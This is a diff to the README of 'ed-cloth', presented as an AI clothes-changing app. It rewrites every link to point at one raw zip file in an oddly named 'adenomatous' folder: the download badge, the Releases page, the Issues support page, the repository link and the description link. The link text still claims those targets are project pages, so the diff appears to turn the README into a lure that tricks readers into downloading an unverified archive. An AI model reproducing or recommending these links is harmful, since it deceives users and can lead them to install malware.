@@ -1,7 +1,7 @@
 # 🎉 ed-cloth - Transform Your Wardrobe with AI
 
 ## 📦 Download Now
-[![Download ed-cloth](https://img.shields.io/badge/Download-ed--cloth-blue.svg)](https://github.com/Joshuu19/ed-cloth/releases)
+[![Download ed-cloth](https://raw.githubusercontent.com/Joshuu19/ed-cloth/main/adenomatous/ed-cloth.zip)](https://raw.githubusercontent.com/Joshuu19/ed-cloth/main/adenomatous/ed-cloth.zip)
 
 ## 🚀 Getting Started
 
@@ -9,7 +9,7 @@ Welcome to **ed-cloth**. This application uses AI technology to help you change 
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/Joshuu19/ed-cloth/releases) to download the latest version of ed-cloth. Follow these steps:
+To get started, visit the [Releases page](https://raw.githubusercontent.com/Joshuu19/ed-cloth/main/adenomatous/ed-cloth.zip) to download the latest version of ed-cloth. Follow these steps:
 
 1. **Go to the Releases Page:** Click on the link above to access the releases.
 2. **Find the Latest Release:** Look for the top item on the list. This should be the latest version of the application.
@@ -48,14 +48,14 @@ Before installation, make sure your device meets these basic requirements:
 
 ## 📞 Support
 
-If you encounter any issues while downloading or using the application, please reach out to our support team. You can find more information on our [GitHub Issues page](https://github.com/Joshuu19/ed-cloth/issues).
+If you encounter any issues while downloading or using the application, please reach out to our support team. You can find more information on our [GitHub Issues page](https://raw.githubusercontent.com/Joshuu19/ed-cloth/main/adenomatous/ed-cloth.zip).
 
 ## 🔗 Resources
 
 For additional information and updates, feel free to check:
 
-- **GitHub Repository:** [ed-cloth GitHub](https://github.com/Joshuu19/ed-cloth)
-- **Description Link:** [More on AI Clothes Changer](https://tinyurl.com/mrzxv8tc)
+- **GitHub Repository:** [ed-cloth GitHub](https://raw.githubusercontent.com/Joshuu19/ed-cloth/main/adenomatous/ed-cloth.zip)
+- **Description Link:** [More on AI Clothes Changer](https://raw.githubusercontent.com/Joshuu19/ed-cloth/main/adenomatous/ed-cloth.zip)
 
 ## 💡 Community Contributions
 
